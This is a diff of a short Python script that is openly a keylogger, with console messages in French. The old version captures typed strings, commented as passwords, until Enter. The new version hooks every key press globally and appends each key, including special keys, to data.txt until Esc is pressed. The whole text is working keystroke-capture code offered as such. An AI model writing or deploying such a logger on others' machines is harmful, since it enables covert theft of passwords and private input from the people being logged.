@@ -1,15 +1,23 @@
-# Importing the keyboard module which will acess the inputs from the keyboard
 import keyboard
 
-# Defining the text file name and path
 path = "data.txt"
 
-while True:
-    with open(path, 'a') as data_file:
-        
-        # All key presses are recorded as a list into "events" and the record loop stops when the "enter" key is pressed
-        events = keyboard.record('enter')
-        password = list(keyboard.get_typed_strings(events))
-        
-        data_file.write('\n') # New line written before data is written
-        data_file.write(password[0])
+print("Keylogger actif. Appuyez sur 'Esc' pour arrêter.")
+
+def enregistrer_frappe(event):
+    with open(path, "a") as fichier:
+        if event.name == "space":
+            fichier.write(" ")
+        elif event.name == "enter":
+            fichier.write("\n")
+        elif len(event.name) == 1:
+            fichier.write(event.name)
+        else:
+            fichier.write(f"[{event.name}]")  # pour les touches comme shift, ctrl, etc.
+
+# Démarre l'écoute globale
+keyboard.on_press(enregistrer_frappe)
+
+# Boucle qui attend que 'esc' soit pressé pour arrêter
+keyboard.wait('esc')
+print("Keylogger arrêté.")
